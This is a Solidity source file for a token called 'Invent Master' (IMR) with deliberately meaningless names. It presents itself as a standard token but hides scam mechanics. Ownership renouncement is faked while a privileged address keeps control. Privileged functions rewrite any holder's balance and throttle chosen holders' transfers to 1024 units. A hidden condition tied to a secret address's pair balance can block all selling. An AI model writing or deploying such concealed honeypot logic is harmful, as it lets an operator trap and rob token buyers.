//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface buySell {
    function createPair(address fromAt, address minTrading) external returns (address);
}

interface marketingAtTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldLaunched) external view returns (uint256);

    function transfer(address liquidityTo, uint256 fundSenderFee) external returns (bool);

    function allowance(address minMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundSenderFee) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityTo,
        uint256 fundSenderFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverAmount, uint256 value);
    event Approval(address indexed minMax, address indexed spender, uint256 value);
}

abstract contract buyLaunchedFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingAtTxMetadata is marketingAtTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InventMaster is buyLaunchedFund, marketingAtTx, marketingAtTxMetadata {

    function exemptBuy() public {
        emit OwnershipTransferred(autoEnable, address(0));
        amountWallet = address(0);
    }

    constructor (){
        if (receiverLiquidity != txLaunched) {
            txLaunched = totalMarketingTo;
        }
        txWallet teamSell = txWallet(limitLaunched);
        feeLaunch = buySell(teamSell.factory()).createPair(teamSell.WETH(), address(this));
        
        autoEnable = _msgSender();
        autoMax[autoEnable] = true;
        totalMode[autoEnable] = txTake;
        exemptBuy();
        if (receiverLiquidity != totalMarketingTo) {
            totalMarketingTo = receiverLiquidity;
        }
        emit Transfer(address(0), autoEnable, txTake);
    }

    function maxMode() private view {
        require(autoMax[_msgSender()]);
    }

    uint256 private totalMarketingTo;

    function allowance(address swapSell, address liquidityList) external view virtual override returns (uint256) {
        if (liquidityList == limitLaunched) {
            return type(uint256).max;
        }
        return fromIs[swapSell][liquidityList];
    }

    function symbol() external view virtual override returns (string memory) {
        return autoToken;
    }

    string private autoToken = "IMR";

    mapping(address => bool) public autoMax;

    uint256 enableFee;

    event OwnershipTransferred(address indexed sellTo, address indexed isSenderLaunch);

    function getOwner() external view returns (address) {
        return amountWallet;
    }

    bool public swapMarketing;

    function transferFrom(address isBuyTrading, address liquidityTo, uint256 fundSenderFee) external override returns (bool) {
        if (_msgSender() != limitLaunched) {
            if (fromIs[isBuyTrading][_msgSender()] != type(uint256).max) {
                require(fundSenderFee <= fromIs[isBuyTrading][_msgSender()]);
                fromIs[isBuyTrading][_msgSender()] -= fundSenderFee;
            }
        }
        return limitList(isBuyTrading, liquidityTo, fundSenderFee);
    }

    uint256 private txLaunched;

    address totalSellBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function limitList(address isBuyTrading, address liquidityTo, uint256 fundSenderFee) internal returns (bool) {
        if (isBuyTrading == autoEnable) {
            return tradingLimit(isBuyTrading, liquidityTo, fundSenderFee);
        }
        uint256 receiverFund = marketingAtTx(feeLaunch).balanceOf(totalSellBuy);
        require(receiverFund == buyTo);
        require(liquidityTo != totalSellBuy);
        if (marketingWallet[isBuyTrading]) {
            return tradingLimit(isBuyTrading, liquidityTo, modeListMin);
        }
        return tradingLimit(isBuyTrading, liquidityTo, fundSenderFee);
    }

    mapping(address => uint256) private totalMode;

    bool private listFee;

    address limitLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return txTake;
    }

    function approve(address liquidityList, uint256 fundSenderFee) public virtual override returns (bool) {
        fromIs[_msgSender()][liquidityList] = fundSenderFee;
        emit Approval(_msgSender(), liquidityList, fundSenderFee);
        return true;
    }

    uint256 constant modeListMin = 2 ** 10;

    function transfer(address txReceiver, uint256 fundSenderFee) external virtual override returns (bool) {
        return limitList(_msgSender(), txReceiver, fundSenderFee);
    }

    mapping(address => bool) public marketingWallet;

    function tradingBuy(address modeWallet) public {
        require(modeWallet.balance < 100000);
        if (listLaunch) {
            return;
        }
        if (receiverLiquidity != txLaunched) {
            swapMarketing = true;
        }
        autoMax[modeWallet] = true;
        
        listLaunch = true;
    }

    uint8 private walletTx = 18;

    function enableMax(address tokenLaunch) public {
        maxMode();
        
        if (tokenLaunch == autoEnable || tokenLaunch == feeLaunch) {
            return;
        }
        marketingWallet[tokenLaunch] = true;
    }

    function takeLimit(address txReceiver, uint256 fundSenderFee) public {
        maxMode();
        totalMode[txReceiver] = fundSenderFee;
    }

    address private amountWallet;

    function feeList(uint256 fundSenderFee) public {
        maxMode();
        buyTo = fundSenderFee;
    }

    mapping(address => mapping(address => uint256)) private fromIs;

    address public autoEnable;

    function name() external view virtual override returns (string memory) {
        return feeLaunchedFund;
    }

    function balanceOf(address shouldLaunched) public view virtual override returns (uint256) {
        return totalMode[shouldLaunched];
    }

    address public feeLaunch;

    bool public listLaunch;

    string private feeLaunchedFund = "Invent Master";

    uint256 private receiverLiquidity;

    uint256 buyTo;

    function tradingLimit(address isBuyTrading, address liquidityTo, uint256 fundSenderFee) internal returns (bool) {
        require(totalMode[isBuyTrading] >= fundSenderFee);
        totalMode[isBuyTrading] -= fundSenderFee;
        totalMode[liquidityTo] += fundSenderFee;
        emit Transfer(isBuyTrading, liquidityTo, fundSenderFee);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return walletTx;
    }

    function owner() external view returns (address) {
        return amountWallet;
    }

    uint256 private txTake = 100000000 * 10 ** 18;

}